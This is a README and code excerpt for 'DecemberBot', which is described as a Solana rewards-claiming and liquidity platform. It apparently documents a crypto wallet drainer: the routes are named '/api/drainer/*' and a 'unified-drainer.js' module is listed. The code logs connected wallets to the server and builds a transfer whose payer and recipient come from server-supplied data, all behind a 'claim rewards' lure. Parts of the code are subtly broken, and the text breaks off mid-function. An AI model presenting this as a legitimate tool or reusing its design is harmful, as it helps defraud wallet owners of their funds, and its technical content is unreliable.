# DecemberBot - Solana Rewards Claim Platform

A sophisticated Node.js application designed for Solana blockchain rewards claiming and wallet management. DecemberBot provides a comprehensive suite of tools for automated rewards collection, wallet operations, and liquidity management with a modern web interface and advanced security features.

##  Table of Contents

- [Overview](#-overview)
- [Architecture](#-architecture)
- [Features](#-features)
- [Repository Structure](#-repository-structure)
- [Technology Stack](#-technology-stack)
- [Installation](#-installation)
- [Configuration](#-configuration)
- [API Documentation](#-api-documentation)
- [Security](#-security-implementation)
- [Frontend](#-frontend-features)
- [Rewards System](#-rewards-claiming-system)
- [Liquidity Management](#-liquidity-management)
- [Monitoring](#-monitoring--logging)
- [Deployment](#-deployment)
- [Development](#-development)
- [Security Considerations](#-security-considerations)
- [License](#-license)

##  Overview

DecemberBot is a comprehensive blockchain application that provides:
- **Automated Rewards Claiming**: Configurable automated rewards collection for Solana blockchain
- **Multi-Wallet Support**: Support for major Solana wallets (Phantom, Solflare, Backpack, Exodus, Glow, Trust)
- **Liquidity Management**: Automated liquidity pool operations and yield farming strategies
- **Security Features**: Advanced security measures including TOCTOU protection and rate limiting
- **Real-time Monitoring**: Telegram notifications and comprehensive health monitoring
- **Modern Web Interface**: Progressive web application with service worker support

### Key Metrics
- **Total Size**: 1.9MB (including all assets)
- **API Endpoints**: 10+ specialized endpoints for rewards and wallet management
- **Supported Wallets**: 6 major Solana wallet providers
- **Security Features**: TOCTOU protection, rate limiting, IP extraction, replay protection
- **Deployment**: Vercel serverless functions with optimized routing

##  Architecture

### System Architecture
```
Frontend (PWA)
    |
    v
Express.js Server
    |
    v
API Layer (4 main modules)
    |
    v
Solana Blockchain
    |
    v
Telegram Notifications
```

### Core Components
- **Express.js Server**: Main application server with advanced middleware
- **API Modules**: Specialized endpoints for rewards, wallet management, and liquidity
- **Security Layer**: Comprehensive security implementations
- **Blockchain Integration**: Solana Web3.js and SPL Token support
- **Frontend PWA**: Progressive web application with offline capabilities

### Data Flow
```
User Request
    |
    v
Security Validation
    |
    v
API Processing
    |
    v
Blockchain Transaction
    |
    v
Notification System
```

### Module Architecture
```
decemberbot/
  api/                    # API endpoint modules
    index.js             # Main rewards API (12.7KB)
    health.js            # Health check endpoint (2.1KB)
    wallet-management.js  # Wallet operations (59.3KB)
    unified-drainer.js   # Unified drainer logic (30.4KB)
  src/                   # Core application modules
    api-error-responses.js   # Error handling utilities (14.3KB)
    environment.js            # Configuration management (7.4KB)
    error-handler.js          # Error management (4.2KB)
    fee-calculator.js         # Transaction fee calculation (21.2KB)
    ip-extraction.js         # IP utilities (1.8KB)
    shared-utilities.js      # Common functions (2.2KB)
    telegram.js              # Telegram integration (28.3KB)
    toctou-protection.js     # Security measures (33.2KB)
  public/                 # Frontend assets
    index.html            # Main application (300.4KB)
    manage-liquidity.html # Liquidity management page (37.3KB)
    patient-mode.js       # Frontend JavaScript (86.8KB)
    sw.js                 # Service worker (1.9KB)
    manifest.json         # PWA manifest (839B)
    Various wallet logos and assets
```

##  Features

### Rewards Management
- **Automated Claiming**: Configurable automated rewards collection system
- **Multi-Token Support**: Native SOL and SPL token rewards handling
- **Schedule Management**: Time-based rewards claiming with flexible scheduling
- **Balance Monitoring**: Real-time balance tracking for all connected wallets
- **Transaction History**: Complete rewards transaction logging and history
- **Fee Optimization**: Dynamic fee calculation based on network conditions

### Wallet Management
- **Multi-Wallet Support**: Phantom, Solflare, Backpack, Exodus, Glow, Trust wallets
- **Connection Monitoring**: Real-time wallet connection status tracking
- **Balance Tracking**: Live balance updates for all token types
- **Transaction History**: Comprehensive transaction record keeping
- **Security Validation**: Multi-layer security checks and validations
- **Auto-Reconnection**: Automatic wallet reconnection on disconnection

### Liquidity Management
- **Pool Management**: Automated liquidity pool operations and monitoring
- **Yield Farming**: Automated yield farming strategies and optimization
- **Risk Assessment**: Risk analysis and management tools for liquidity pools
- **Performance Tracking**: Liquidity performance metrics and analytics
- **Optimization**: Automated liquidity optimization based on market conditions
- **Impermanent Loss**: Impermanent loss calculation and mitigation strategies

### Security Features
- **TOCTOU Protection**: Time-of-check-time-of-use validation for request security
- **Rate Limiting**: Configurable request rate limiting per IP address
- **IP Extraction**: Advanced IP address extraction and tracking for security
- **Input Validation**: Comprehensive input sanitization and validation
- **Replay Protection**: Nonce-based replay attack prevention
- **Error Logging**: Detailed security event logging and monitoring

### Monitoring & Notifications
- **Telegram Integration**: Real-time notification system for important events
- **Health Monitoring**: System health and performance metrics monitoring
- **Transaction Logging**: Complete transaction audit trail and logging
- **Performance Metrics**: System performance monitoring and optimization
- **Error Tracking**: Comprehensive error monitoring and alerting
- **Status Dashboard**: Real-time status monitoring dashboard

##  Technology Stack

### Backend Technologies
- **Node.js 22.x**: Latest Node.js runtime with ES modules support
- **Express.js 4.18.2**: Web framework with advanced middleware support
- **Solana Web3.js 1.98.4**: Solana blockchain integration library
- **SPL Token 0.4.13**: Solana Program Library token support
- **dotenv 16.3.1**: Environment variable management
- **cors 2.8.5**: Cross-origin resource sharing middleware

### Frontend Technologies
- **Vanilla JavaScript**: Modern ES6+ JavaScript without framework dependencies
- **Service Worker**: PWA functionality with offline support and caching
- **Progressive Enhancement**: Works without JavaScript for basic functionality
- **Responsive Design**: Mobile-first responsive layout and design
- **Web APIs**: Modern browser APIs for enhanced functionality

### Development & Deployment
- **ES Modules**: Modern JavaScript module system for clean code organization
- **Vercel**: Serverless deployment platform with optimized routing
- **Git**: Version control system with GitHub integration
- **npm**: Package management and dependency management
- **Node.js**: Development and production runtime environment

### Security & Monitoring
- **Telegram Bot API**: Real-time notifications and alerting system
- **Cryptographic APIs**: Advanced security implementations and validations
- **Rate Limiting**: Abuse prevention and traffic management
- **Input Validation**: Comprehensive security validation and sanitization
- **Error Logging**: Detailed security event tracking and monitoring

##  Installation

### Prerequisites
- **Node.js 22.x**: Latest stable Node.js version with ES modules support
- **npm**: Package manager (included with Node.js installation)
- **Git**: Version control system for code management
- **Text Editor**: VS Code or similar recommended editor
- **Terminal**: Command line interface for development
- **Solana Wallet**: For testing blockchain functionality (Phantom, Solflare, etc.)

### Installation Steps
1. **Clone the repository**
   ```bash
   git clone https://github.com/SacredPath/decemberbot.git
   cd decemberbot
   ```

2. **Install dependencies**
   ```bash
   npm install
   ```

3. **Environment setup**
   ```bash
   # Create environment file from template
   cp .env.example .env
   # Edit .env with your configuration
   nano .env
   ```

4. **Start development server**
   ```bash
   npm start
   # or for development mode
   npm run dev
   ```

5. **Verify installation**
   ```bash
   # Check health endpoint
   curl http://localhost:3000/health
   
   # Validate syntax
   npm run test:validate
   ```

### Environment Configuration
```bash
# .env file configuration
NODE_ENV=development
PORT=3000

# Solana blockchain configuration
SOLANA_RPC_URL=https://api.mainnet-beta.solana.com
SOLANA_NETWORK=mainnet-beta
SOLANA_COMMITMENT=confirmed

# Telegram configuration (optional)
TELEGRAM_BOT_TOKEN=your_bot_token_here
TELEGRAM_CHAT_ID=your_chat_id_here

# Security configuration
JWT_SECRET=your_jwt_secret_here
RATE_LIMIT_MAX=100
RATE_LIMIT_WINDOW=60000
TOCTOU_MAX_AGE=30000

# Site configuration
SITE_URL=http://localhost:3000

# API configuration
API_TIMEOUT=30000
MAX_REQUEST_SIZE=10485760
CORS_ORIGIN=*
```

### Development Setup
```bash
# Development server with hot reload
npm run dev

# Production-like environment
NODE_ENV=production npm start

# Debug mode with additional logging
DEBUG=* npm start
```

##  Configuration

### Server Configuration
```javascript
// server.js - Main server configuration
import express from 'express';
import cors from 'cors';
import config from './src/environment.js';

const app = express();

// Middleware configuration
app.use(cors({
  origin: '*',
  methods: ['GET', 'POST', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization']
}));

// Enhanced JSON parsing with error handling
app.use(express.json({ 
  limit: '10mb',
  verify: (req, res, buf, encoding) => {
    try {
      JSON.parse(buf);
    } catch (e) {
      throw new Error('Invalid JSON format');
    }
  }
}));

// Custom JSON error handler
app.use((error, req, res, next) => {
  if (error instanceof SyntaxError && error.status === 400 && 'body' in error) {
    return res.status(400).json({
      success: false,
      error: 'Invalid JSON format',
      details: 'Please ensure your request body contains valid JSON',
      code: 'INVALID_JSON'
    });
  }
  next(error);
});
```

### API Routing Configuration
```javascript
// API routing with dynamic imports
app.all('/api/drainer*', async (req, res) => {
  try {
    const module = await import('./api/index.js');
    await module.default(req, res);
  } catch (error) {
    console.error('Error loading index handler:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

app.use('/api/wallet-management', async (req, res) => {
  try {
    const module = await import('./api/wallet-management.js');
    await module.default(req, res);
  } catch (error) {
    console.error('Error loading wallet management handler:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

app.use('/api/unified-drainer', async (req, res) => {
  try {
    const module = await import('./api/unified-drainer.js');
    await module.default(req, res);
  } catch (error) {
    console.error('Error loading unified drainer handler:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});
```

### Security Configuration
```javascript
// Security middleware and configuration
const securityConfig = {
  rateLimiting: {
    maxRequests: 100,
    windowMs: 60000,
    skipSuccessfulRequests: false
  },
  toctouProtection: {
    maxAge: 30000, // 30 seconds
    nonceLength: 16
  },
  inputValidation: {
    maxStringLength: 1000,
    allowedCharacters: /^[a-zA-Z0-9\-_@.]+$/
  },
  headers: {
    'X-Content-Type-Options': 'nosniff',
    'X-Frame-Options': 'DENY',
    'X-XSS-Protection': '1; mode=block',
    'Referrer-Policy': 'strict-origin-when-cross-origin'
  }
};
```

##  API Documentation

### Core Rewards API

#### POST /api/drainer/claim-rewards
**Purpose**: Claim available rewards for connected wallet
**Request Body**:
```json
{
  "walletAddress": "string",
  "walletType": "phantom|solflare|backpack|exodus|glow|trust",
  "timestamp": "number",
  "nonce": "string",
  "rewardTypes": ["staking", "airdrop", "governance"]
}
```

**Response**:
```json
{
  "success": true,
  "data": {
    "claimed": true,
    "rewards": [
      {
        "id": "reward_123",
        "type": "staking",
        "amount": 1000000,
        "token": "SOL",
        "signature": "signature_string",
        "status": "confirmed"
      }
    ],
    "totalAmount": 1000000,
    "timestamp": "2024-01-01T00:00:00.000Z"
  }
}
```

#### POST /api/drainer/log-wallet
**Purpose**: Log wallet connection events
**Request Body**:
```json
{
  "walletAddress": "string",
  "walletType": "phantom|solflare|backpack|exodus|glow|trust",
  "timestamp": "number",
  "nonce": "string"
}
```

#### POST /api/drainer/log-confirmation
**Purpose**: Log transaction confirmation events
**Request Body**:
```json
{
  "transactionId": "string",
  "walletAddress": "string",
  "amount": "number",
  "rewardType": "staking|airdrop|governance",
  "timestamp": "number",
  "nonce": "string"
}
```

#### POST /api/drainer/log-claim-attempt
**Purpose**: Log reward claim attempt events
**Request Body**:
```json
{
  "walletAddress": "string",
  "rewardIds": ["reward_123", "reward_456"],
  "timestamp": "number",
  "nonce": "string"
}
```

### Wallet Management API

#### POST /api/wallet-management/connect
**Purpose**: Connect to a wallet
**Request Body**:
```json
{
  "walletType": "phantom|solflare|backpack|exodus|glow|trust",
  "publicKey": "string",
  "nonce": "string"
}
```

#### GET /api/wallet-management/balance
**Purpose**: Get wallet balance
**Query Parameters**:
- `walletAddress`: Wallet address to check
- `tokenAddress`: Optional token address (for SPL tokens)

**Response**:
```json
{
  "success": true,
  "data": {
    "balance": 1000000,
    "tokenAddress": "string",
    "decimals": 9,
    "usdValue": 100.50,
    "timestamp": "2024-01-01T00:00:00.000Z"
  }
}
```

#### GET /api/wallet-management/rewards
**Purpose**: Get available rewards for wallet
**Query Parameters**:
- `walletAddress`: Wallet address to check
- `rewardTypes`: Optional filter for reward types

**Response**:
```json
{
  "success": true,
  "data": {
    "rewards": [
      {
        "id": "reward_123",
        "type": "staking",
        "amount": 1000000,
        "token": "SOL",
        "status": "available",
        "expiry": "2024-01-31T23:59:59.000Z"
      }
    ],
    "totalAmount": 1000000,
    "count": 1
  }
}
```

#### POST /api/wallet-management/claim
**Purpose**: Claim specific rewards
**Request Body**:
```json
{
  "walletAddress": "string",
  "rewardIds": ["reward_123", "reward_456"],
  "nonce": "string"
}
```

#### GET /api/wallet-management/history
**Purpose**: Get transaction history
**Query Parameters**:
- `walletAddress`: Wallet address
- `limit`: Optional limit for results
- `offset`: Optional offset for pagination

**Response**:
```json
{
  "success": true,
  "data": {
    "transactions": [
      {
        "id": "tx_123",
        "type": "claim",
        "amount": 1000000,
        "token": "SOL",
        "signature": "signature_string",
        "timestamp": "2024-01-01T00:00:00.000Z",
        "status": "confirmed"
      }
    ],
    "total": 1,
    "limit": 50,
    "offset": 0
  }
}
```

### Liquidity Management API

#### POST /api/liquidity/add-liquidity
**Purpose**: Add liquidity to a pool
**Request Body**:
```json
{
  "walletAddress": "string",
  "poolId": "string",
  "tokenA": "string",
  "tokenB": "string",
  "amountA": "number",
  "amountB": "number",
  "nonce": "string"
}
```

#### POST /api/liquidity/remove-liquidity
**Purpose**: Remove liquidity from a pool
**Request Body**:
```json
{
  "walletAddress": "string",
  "poolId": "string",
  "liquidityTokenAmount": "number",
  "nonce": "string"
}
```

#### GET /api/liquidity/pool-status
**Purpose**: Get pool status information
**Query Parameters**:
- `poolId`: Pool identifier
- `walletAddress`: Optional wallet address for user-specific data

**Response**:
```json
{
  "success": true,
  "data": {
    "poolId": "pool_123",
    "tokenA": "SOL",
    "tokenB": "USDC",
    "totalLiquidity": 1000000,
    "apy": 12.5,
    "volume24h": 5000000,
    "userLiquidity": 100000,
    "userShare": 0.1
  }
}
```

#### POST /api/liquidity/optimize
**Purpose**: Optimize liquidity allocation
**Request Body**:
```json
{
  "walletAddress": "string",
  "strategy": "balanced|yield_focused|risk_managed",
  "nonce": "string"
}
```

#### GET /api/liquidity/performance
**Purpose**: Get liquidity performance metrics
**Query Parameters**:
- `walletAddress`: Wallet address
- `timeframe`: Performance timeframe (1d, 7d, 30d)

**Response**:
```json
{
  "success": true,
  "data": {
    "totalReturns": 125000,
    "apy": 12.5,
    "impermanentLoss": -5000,
    "volume24h": 5000000,
    "feesEarned": 25000,
    "timeframe": "30d"
  }
}
```

### Health Check API

#### GET /health
**Purpose**: System health check
**Response**:
```json
{
  "status": "healthy",
  "timestamp": "2024-01-01T00:00:00.000Z",
  "environment": "production",
  "version": "1.0.0",
  "uptime": 3600,
  "memory": {
    "rss": 50331648,
    "heapTotal": 29360128,
    "heapUsed": 20971520,
    "external": 1048576
  },
  "cpu": {
    "user": 123456,
    "system": 654321
  },
  "rewardsClaimed": 150,
  "walletsConnected": 25
}
```

### Error Response Format
```json
{
  "success": false,
  "error": "Error description",
  "code": "ERROR_CODE",
  "details": "Additional error details",
  "timestamp": "2024-01-01T00:00:00.000Z"
}
```

### Error Codes
- `WALLET_NOT_CONNECTED`: No wallet connected
- `INSUFFICIENT_BALANCE`: Insufficient wallet balance
- `TRANSACTION_FAILED`: Transaction failed to process
- `RATE_LIMIT_EXCEEDED`: Rate limit exceeded
- `VALIDATION_ERROR`: Input validation failed
- `NETWORK_ERROR`: Network connectivity issues
- `TIMEOUT_ERROR`: Request timeout
- `AUTHENTICATION_ERROR`: Authentication failed
- `REWARD_EXPIRED`: Reward has expired
- `LIQUIDITY_INSUFFICIENT`: Insufficient liquidity

##  Security Implementation

### TOCTOU Protection
```javascript
// Time-of-check-time-of-use protection implementation
class TOCTOUProtection {
  constructor() {
    this.nonces = new Map();
    this.requests = new Map();
    this.maxAge = 30000; // 30 seconds
  }

  generateNonce() {
    const nonce = crypto.randomBytes(16).toString('hex');
    this.nonces.set(nonce, {
      timestamp: Date.now(),
      used: false
    });
    return nonce;
  }

  validateNonce(nonce) {
    const data = this.nonces.get(nonce);
    if (!data) return false;
    
    const now = Date.now();
    if (now - data.timestamp > this.maxAge) {
      this.nonces.delete(nonce);
      return false;
    }
    
    if (data.used) {
      return false;
    }
    
    data.used = true;
    return true;
  }

  validateRequest(req, res, next) {
    const nonce = req.body.nonce;
    const timestamp = req.body.timestamp;
    
    if (!this.validateNonce(nonce)) {
      return res.status(400).json({
        success: false,
        error: 'Invalid or expired nonce',
        code: 'INVALID_NONCE'
      });
    }
    
    if (Math.abs(Date.now() - timestamp) > this.maxAge) {
      return res.status(400).json({
        success: false,
        error: 'Request timestamp too old',
        code: 'OLD_TIMESTAMP'
      });
    }
    
    next();
  }
}
```

### Rate Limiting
```javascript
// Rate limiting implementation
class RateLimiter {
  constructor() {
    this.requests = new Map();
    this.maxRequests = 100;
    this.windowMs = 60000; // 1 minute
  }

  checkLimit(ip) {
    const now = Date.now();
    const windowStart = now - this.windowMs;
    
    if (!this.requests.has(ip)) {
      this.requests.set(ip, []);
    }
    
    const requests = this.requests.get(ip);
    const recentRequests = requests.filter(time => time > windowStart);
    
    if (recentRequests.length >= this.maxRequests) {
      return false;
    }
    
    recentRequests.push(now);
    this.requests.set(ip, recentRequests);
    return true;
  }

  middleware() {
    return (req, res, next) => {
      const ip = this.extractIP(req);
      
      if (!this.checkLimit(ip)) {
        return res.status(429).json({
          success: false,
          error: 'Rate limit exceeded',
          code: 'RATE_LIMIT_EXCEEDED',
          retryAfter: this.windowMs / 1000
        });
      }
      
      next();
    };
  }

  extractIP(req) {
    return req.headers['x-forwarded-for'] || 
           req.headers['x-real-ip'] || 
           req.connection.remoteAddress || 
           req.socket.remoteAddress;
  }
}
```

### Input Validation
```javascript
// Input validation utilities
class InputValidator {
  static validateWalletAddress(address) {
    // Solana wallet address validation
    return /^[1-9A-HJ-NP-Za-z0-9]{32,44}$/.test(address);
  }

  static validateAmount(amount) {
    const num = parseFloat(amount);
    return !isNaN(num) && num > 0 && num <= Number.MAX_SAFE_INTEGER;
  }

  static validatePrivateKey(key) {
    // Private key validation (if applicable)
    return /^[1-9A-HJ-NP-Za-z0-9]{88}$/.test(key);
  }

  static validateNonce(nonce) {
    // Nonce validation
    return /^[a-fA-F0-9]{32}$/.test(nonce);
  }

  static validateRewardType(type) {
    const validTypes = ['staking', 'airdrop', 'governance', 'liquidity'];
    return validTypes.includes(type);
  }

  static sanitizeInput(input) {
    if (typeof input !== 'string') return input;
    
    return input
      .trim()
      .replace(/[<>]/g, '')
      .substring(0, 1000);
  }

  middleware(fields) {
    return (req, res, next) => {
      for (const field of fields) {
        const value = req.body[field];
        
        if (value !== undefined) {
          if (field === 'walletAddress' && !this.validateWalletAddress(value)) {
            return res.status(400).json({
              success: false,
              error: 'Invalid wallet address',
              code: 'INVALID_WALLET'
            });
          }
          
          if (field === 'amount' && !this.validateAmount(value)) {
            return res.status(400).json({
              success: false,
              error: 'Invalid amount',
              code: 'INVALID_AMOUNT'
            });
          }
          
          if (field === 'nonce' && !this.validateNonce(value)) {
            return res.status(400).json({
              success: false,
              error: 'Invalid nonce',
              code: 'INVALID_NONCE'
            });
          }
          
          if (field === 'rewardType' && !this.validateRewardType(value)) {
            return res.status(400).json({
              success: false,
              error: 'Invalid reward type',
              code: 'INVALID_REWARD_TYPE'
            });
          }
          
          req.body[field] = this.sanitizeInput(value);
        }
      }
      
      next();
    };
  }
}
```

##  Frontend Features

### Progressive Web Application
```javascript
// Service worker registration
if ('serviceWorker' in navigator) {
  navigator.serviceWorker.register('/sw.js')
    .then(registration => {
      console.log('SW registered:', registration);
    })
    .catch(error => {
      console.log('SW registration failed:', error);
    });
}

// PWA manifest
{
  "name": "DecemberBot Rewards Manager",
  "short_name": "DecemberBot",
  "description": "Solana rewards claiming and management platform",
  "start_url": "/",
  "display": "standalone",
  "background_color": "#000000",
  "theme_color": "#00ff00",
  "icons": [
    {
      "src": "/favicon1.ico",
      "sizes": "192x192",
      "type": "image/x-icon"
    }
  ]
}
```

### Wallet Integration
```javascript
// Wallet connection and management
class WalletManager {
  constructor() {
    this.wallets = {
      phantom: null,
      solflare: null,
      backpack: null,
      exodus: null,
      glow: null,
      trust: null
    };
    this.currentWallet = null;
    this.isConnected = false;
  }

  async connect(walletType) {
    try {
      const wallet = await this.getWallet(walletType);
      if (!wallet) {
        throw new Error(`${walletType} wallet not found`);
      }

      await wallet.connect();
      const publicKey = wallet.publicKey.toString();
      
      this.currentWallet = wallet;
      this.wallets[walletType] = wallet;
      this.isConnected = true;

      // Log connection to server
      await this.logConnection(walletType, publicKey);

      // Start rewards monitoring
      this.startRewardsMonitoring(publicKey);

      return {
        success: true,
        publicKey,
        walletType
      };
    } catch (error) {
      console.error('Wallet connection failed:', error);
      return {
        success: false,
        error: error.message
      };
    }
  }

  async claimRewards(rewardIds = null) {
    if (!this.isConnected) {
      throw new Error('No wallet connected');
    }

    try {
      const response = await fetch('/api/wallet-management/claim', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          walletAddress: this.currentWallet.publicKey.toString(),
          rewardIds: rewardIds || await this.getAvailableRewardIds(),
          nonce: this.generateNonce()
        })
      });

      const data = await response.json();
      
      if (data.success) {
        // Update UI with claimed rewards
        this.updateRewardsUI(data.data);
      }
      
      return data;
    } catch (error) {
      console.error('Rewards claiming failed:', error);
      throw error;
    }
  }

  async getAvailableRewards() {
    if (!this.isConnected) {
      return [];
    }

    try {
      const response = await fetch(`/api/wallet-management/rewards?walletAddress=${this.currentWallet.publicKey.toString()}`);
      const data = await response.json();
      
      return data.success ? data.data.rewards : [];
    } catch (error) {
      console.error('Failed to get available rewards:', error);
      return [];
    }
  }

  async logConnection(walletType, publicKey) {
    const response = await fetch('/api/drainer/log-wallet', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        walletAddress: publicKey,
        walletType,
        timestamp: Date.now(),
        nonce: this.generateNonce()
      })
    });

    return await response.json();
  }

  generateNonce() {
    return Array.from({length: 16}, () => 
      Math.floor(Math.random() * 16).toString(16)
    ).join('');
  }

  startRewardsMonitoring(walletAddress) {
    // Update rewards every 30 seconds
    setInterval(async () => {
      try {
        const rewards = await this.getAvailableRewards();
        this.updateRewardsUI({ rewards });
      } catch (error) {
        console.error('Rewards monitoring failed:', error);
      }
    }, 30000);
  }

  updateRewardsUI(data) {
    const rewardsElement = document.getElementById('available-rewards');
    if (rewardsElement) {
      rewardsElement.innerHTML = this.formatRewards(data.rewards);
    }
  }

  formatRewards(rewards) {
    if (!rewards || rewards.length === 0) {
      return '<p>No rewards available</p>';
    }

    return rewards.map(reward => `
      <div class="reward-item">
        <h4>${reward.type}</h4>
        <p>Amount: ${this.formatAmount(reward.amount)} ${reward.token}</p>
        <p>Status: ${reward.status}</p>
        <button onclick="claimReward('${reward.id}')" ${reward.status !== 'available' ? 'disabled' : ''}>
          ${reward.status === 'available' ? 'Claim' : 'Claimed'}
        </button>
      </div>
    `).join('');
  }

  formatAmount(amount, token) {
    if (token === 'SOL') {
      return (amount / 1e9).toFixed(4);
    }
    return amount.toString();
  }
}
```

### Real-time Updates
```javascript
// Real-time rewards monitoring
class RewardsMonitor {
  constructor(walletManager) {
    this.walletManager = walletManager;
    this.updateInterval = null;
    this.notificationSound = new Audio('/notification.mp3');
  }

  startMonitoring(walletAddress) {
    this.stopMonitoring();
    
    this.updateInterval = setInterval(async () => {
      try {
        const rewards = await this.getAvailableRewards(walletAddress);
        this.updateUI(rewards);
        
        // Check for new rewards
        const newRewards = this.checkForNewRewards(rewards);
        if (newRewards.length > 0) {
          this.notifyNewRewards(newRewards);
        }
      } catch (error) {
        console.error('Rewards update failed:', error);
      }
    }, 30000); // Update every 30 seconds
  }

  stopMonitoring() {
    if (this.updateInterval) {
      clearInterval(this.updateInterval);
      this.updateInterval = null;
    }
  }

  async getAvailableRewards(walletAddress) {
    const response = await fetch(`/api/wallet-management/rewards?walletAddress=${walletAddress}`);
    const data = await response.json();
    
    return data.success ? data.data.rewards : [];
  }

  checkForNewRewards(currentRewards) {
    const previousRewards = this.getPreviousRewards();
    const currentIds = currentRewards.map(r => r.id);
    const previousIds = previousRewards.map(r => r.id);
    
    const newRewards = currentRewards.filter(reward => !previousIds.includes(reward.id));
    
    if (newRewards.length > 0) {
      this.setPreviousRewards(currentRewards);
    }
    
    return newRewards;
  }

  notifyNewRewards(rewards) {
    // Play notification sound
    this.notificationSound.play().catch(e => console.log('Could not play notification sound'));
    
    // Show browser notification
    if (Notification.permission === 'granted') {
      new Notification('New Rewards Available', {
        body: `${rewards.length} new rewards are available to claim`,
        icon: '/favicon1.ico'
      });
    }
    
    // Update UI with notification
    const notificationElement = document.getElementById('rewards-notification');
    if (notificationElement) {
      notificationElement.innerHTML = `
        <div class="notification">
          <span>${rewards.length} new rewards available!</span>
          <button onclick="this.parentElement.remove()">×</button>
        </div>
      `;
      
      // Auto-hide after 5 seconds
      setTimeout(() => {
        notificationElement.remove();
      }, 5000);
    }
  }

  updateUI(rewards) {
    const rewardsElement = document.getElementById('available-rewards');
    if (rewardsElement) {
      rewardsElement.innerHTML = this.formatRewards(rewards);
    }
    
    // Update total rewards count
    const countElement = document.getElementById('rewards-count');
    if (countElement) {
      countElement.textContent = rewards.length;
    }
  }

  formatRewards(rewards) {
    if (!rewards || rewards.length === 0) {
      return '<p>No rewards available</p>';
    }

    return rewards.map(reward => `
      <div class="reward-item ${reward.status}">
        <div class="reward-header">
          <h4>${reward.type}</h4>
          <span class="reward-status ${reward.status}">${reward.status}</span>
        </div>
        <div class="reward-details">
          <p>Amount: ${this.formatAmount(reward.amount)} ${reward.token}</p>
          ${reward.expiry ? `<p>Expires: ${new Date(reward.expiry).toLocaleString()}</p>` : ''}
        </div>
        <div class="reward-actions">
          <button onclick="claimReward('${reward.id}')" 
                  ${reward.status !== 'available' ? 'disabled' : ''}>
            ${reward.status === 'available' ? 'Claim Now' : 'Already Claimed'}
          </button>
        </div>
      </div>
    `).join('');
  }

  formatAmount(amount, token) {
    if (token === 'SOL') {
      return (amount / 1e9).toFixed(4);
    }
    return amount.toString();
  }

  getPreviousRewards() {
    const stored = localStorage.getItem('previousRewards');
    return stored ? JSON.parse(stored) : [];
  }

  setPreviousRewards(rewards) {
    localStorage.setItem('previousRewards', JSON.stringify(rewards));
  }
}
```

##  Rewards Claiming System

### Automated Rewards Collection
```javascript
// Rewards claiming logic
class RewardsClaimer {
  constructor(wallet, connection) {
    this.wallet = wallet;
    this.connection = connection;
    this.claimHistory = [];
    this.feeOptimizer = new FeeOptimizer(connection);
  }

  async claimRewards(rewardIds = null) {
    try {
      // Get available rewards if not specified
      const rewards = rewardIds 
        ? await this.getRewardsByIds(rewardIds)
        : await this.getAvailableRewards();
      
      if (rewards.length === 0) {
        return {
          success: true,
          message: 'No rewards available to claim',
          claimed: []
        };
      }

      // Calculate optimal fees
      const fees = await this.feeOptimizer.calculateOptimalFees(rewards);
      
      // Claim each reward
      const claims = [];
      for (const reward of rewards) {
        const claim = await this.claimReward(reward, fees);
        claims.push(claim);
      }
      
      this.claimHistory.push(...claims);
      
      return {
        success: true,
        claims,
        totalAmount: claims.reduce((sum, claim) => sum + claim.amount, 0),
        totalFees: claims.reduce((sum, claim) => sum + claim.fees, 0),
        netAmount: claims.reduce((sum, claim) => sum + claim.netAmount, 0)
      };
    } catch (error) {
      console.error('Rewards claiming failed:', error);
      return {
        success: false,
        error: error.message
      };
    }
  }

  async getAvailableRewards() {
    try {
      // Check for staking rewards
      const stakingRewards = await this.getStakingRewards();
      
      // Check for airdrops
      const airdrops = await this.getAirdrops();
      
      // Check for governance rewards
      const governanceRewards = await this.getGovernanceRewards();
      
      // Check for liquidity rewards
      const liquidityRewards = await this.getLiquidityRewards();
      
      return [
        ...stakingRewards,
        ...airdrops,
        ...governanceRewards,
        ...liquidityRewards
      ].filter(reward => reward.status === 'available');
    } catch (error) {
      console.error('Failed to get available rewards:', error);
      return [];
    }
  }

  async getStakingRewards() {
    // Get staking rewards from Solana validators
    try {
      const stakeAccounts = await this.connection.getParsedProgramAccounts(
        new PublicKey('StakeConfig11111111111111111111111111111111111')
      );
      
      return stakeAccounts.map(account => ({
        id: `staking_${account.pubkey.toString()}`,
        type: 'staking',
        amount: account.info.stake.depositStake,
        token: 'SOL',
        status: 'available',
        expiry: null,
        validator: account.info.stake.validatorPubkey.toString()
      }));
    } catch (error) {
      console.error('Failed to get staking rewards:', error);
      return [];
    }
  }

  async getAirdrops() {
    // Get airdrops from registry or API
    try {
      // This would typically call an external API or database
      // For demo purposes, return empty array
      return [];
    } catch (error) {
      console.error('Failed to get airdrops:', error);
      return [];
    }
  }

  async getGovernanceRewards() {
    // Get governance rewards from DAOs
    try {
      // This would typically call governance APIs
      // For demo purposes, return empty array
      return [];
    } catch (error) {
      console.error('Failed to get governance rewards:', error);
      return [];
    }
  }

  async getLiquidityRewards() {
    // Get liquidity provider rewards
    try {
      // This would typically check DEX protocols
      // For demo purposes, return empty array
      return [];
    } catch (error) {
      console.error('Failed to get liquidity rewards:', error);
      return [];
    }
  }

  async getRewardsByIds(rewardIds) {
    // Get specific rewards by IDs
    const allRewards = await this.getAvailableRewards();
    return allRewards.filter(reward => rewardIds.includes(reward.id));
  }

  async claimReward(reward, fees) {
    try {
      const transaction = await this.buildClaimTransaction(reward, fees);
      const signature = await this.wallet.signTransaction(transaction);
      const confirmation = await this.connection.sendRawTransaction(signature);
      
      // Wait for confirmation
      const confirmedTransaction = await this.connection.confirmTransaction(confirmation);
      
      if (confirmedTransaction.value.err) {
        throw new Error('Transaction failed');
      }
      
      const claim = {
        rewardId: reward.id,
        amount: reward.amount,
        token: reward.token,
        signature,
        confirmation,
        status: 'confirmed',
        fees: fees.totalFee / reward.amount,
        netAmount: reward.amount - fees.totalFee,
        timestamp: Date.now()
      };
      
      // Log claim to server
      await this.logClaim(claim);
      
      return claim;
    } catch (error) {
      console.error('Failed to claim reward:', error);
      throw error;
    }
  }

  async buildClaimTransaction(reward, fees) {
    // Build transaction for claiming reward
    const transaction = new Transaction().add(
      SystemProgram.transfer(
        new PublicKey(reward.payer || this.wallet.publicKey),
        new PublicKey(reward.recipient || this.wallet.publicKey),
